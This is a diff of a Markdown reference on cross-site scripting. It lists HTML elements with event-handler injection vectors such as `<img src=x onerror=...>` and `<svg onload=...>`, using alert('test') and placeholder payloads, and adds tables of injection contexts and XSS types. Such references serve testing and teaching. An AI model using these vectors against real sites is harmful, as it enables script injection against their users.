@@ -3,20 +3,60 @@
 
 ## Auto-Triggered 
 
-| Element | Common Events | Example Structure |
-|----------|--------------|------------------|
-| `<body>` | `onload` | `<body onload="XSS_PAYLOAD">` |
-| `<img>` | `onload`, `onerror` | `<img src="invalid" onerror="XSS_PAYLOAD">` |
-| `<svg>` | `onload` | `<svg onload="XSS_PAYLOAD">` |
-| `<iframe>` | `onload` | `<iframe onload="XSS_PAYLOAD">` |
-| `<video>` | `onload`, `onerror` | `<video onerror="XSS_PAYLOAD">` |
-| `<audio>` | `onload`, `onerror` | `<audio onerror="XSS_PAYLOAD">` |
-| `<a>` | `onclick`, `onmouseover` | `<a onclick="XSS_PAYLOAD">Link</a>` |
-| `<button>` | `onclick` | `<button onclick="XSS_PAYLOAD">Click</button>` |
-| `<div>` | `onclick`, `onmouseover` | `<div onclick="XSS_PAYLOAD">Content</div>` |
-| `<input>` | `onfocus`, `onchange` | `<input onfocus="XSS_PAYLOAD">` |
-| `<textarea>` | `onfocus`, `onchange` | `<textarea onfocus="XSS_PAYLOAD"></textarea>` |
-| `<form>` | `onsubmit` | `<form onsubmit="XSS_PAYLOAD">` |
+# XSS HTML Element Reference
+
+## Auto-Triggered Events
+
+| Element | Common Events | Example |
+|----------|---------------|---------|
+| `<body>` | `onload` | `<body onload="alert('test')">` |
+| `<img>` | `onload`, `onerror` | `<img src="x" onerror="alert('test')">` |
+| `<svg>` | `onload` | `<svg onload="alert('test')">` |
+| `<iframe>` | `onload` | `<iframe onload="alert('test')">` |
+| `<video>` | `onload`, `onerror` | `<video onerror="alert('test')">` |
+| `<audio>` | `onload`, `onerror` | `<audio onerror="alert('test')">` |
+
+---
+
+## User Interaction Events
+
+| Element | Common Events | Example |
+|----------|---------------|---------|
+| `<a>` | `onclick`, `onmouseover` | `<a onclick="alert('test')">Link</a>` |
+| `<button>` | `onclick` | `<button onclick="alert('test')">Click</button>` |
+| `<div>` | `onclick`, `onmouseover` | `<div onclick="alert('test')">Content</div>` |
+
+---
+
+## Form Events
+
+| Element | Common Events | Example |
+|----------|---------------|---------|
+| `<input>` | `onfocus`, `onchange` | `<input onfocus="alert('test')">` |
+| `<textarea>` | `onfocus`, `onchange` | `<textarea onfocus="alert('test')"></textarea>` |
+| `<form>` | `onsubmit` | `<form onsubmit="alert('test')">` |
+
+---
+
+## XSS Contexts
+
+| Context | Example |
+|---------|---------|
+| HTML | `<div>INPUT</div>` |
+| Attribute | `<input value="INPUT">` |
+| JavaScript | `<script>INPUT</script>` |
+| CSS | `<style>INPUT</style>` |
+| URL | `href="INPUT"` / `src="INPUT"` |
+
+---
+
+## XSS Types
+
+| Type | Description |
+|------|-------------|
+| Reflected | Input is returned immediately in the response |
+| Stored | Input is saved and shown to users later |
+| DOM-Based | Client-side JavaScript processes the input |
 
 
 <img src=x onerror="xss_PAYLOAD">
